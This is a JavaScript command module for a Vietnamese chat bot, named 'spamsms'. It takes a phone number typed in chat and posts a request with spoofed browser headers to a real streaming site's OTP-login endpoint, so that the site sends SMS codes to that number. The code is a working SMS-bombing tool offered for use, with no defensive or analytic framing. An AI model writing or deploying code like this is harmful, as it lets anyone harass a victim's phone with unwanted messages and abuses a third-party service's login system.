const axios = require('axios');

module.exports = {
  name: "spamsms",
  usedby: 0,
  info: "gửi thông báo đến số",
  onPrefix: false,
  cooldowns: 10,

  onLaunch: function ({ api, event }) {
    const args = event.body.trim().split(" ");
    if (args.length < 2) {
      return api.sendMessage("Vui lòng nhập số điện thoại. Ví dụ: spamsms 0123456789", event.threadID, event.messageID);
    }

    const phone = args[1];

    axios.post("http://m.tv360.vn/public/v1/auth/get-otp-login", 
      {
        msisdn: "0" + phone.slice(1, 11)
      },
      {
        headers: {
          "Host": "m.tv360.vn",
          "Connection": "keep-alive",
          "Content-Length": "23",
          "Accept": "application/json, text/plain, */*",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36",
          "Content-Type": "application/json",
          "Origin": "http://m.tv360.vn",
          "Referer": "http://m.tv360.vn/login?r=http%3A%2F%2Fm.tv360.vn%2F",
          "Accept-Encoding": "gzip, deflate"
        }
      }
    )
    .then(response => {
      api.sendMessage(`Gửi thông báo thành công đến số ${phone}`, event.threadID, event.messageID);
    })
    .catch(error => {
      api.sendMessage(`Gửi thông báo thất bại: ${error.message}`, event.threadID, event.messageID);
    });
  }
};
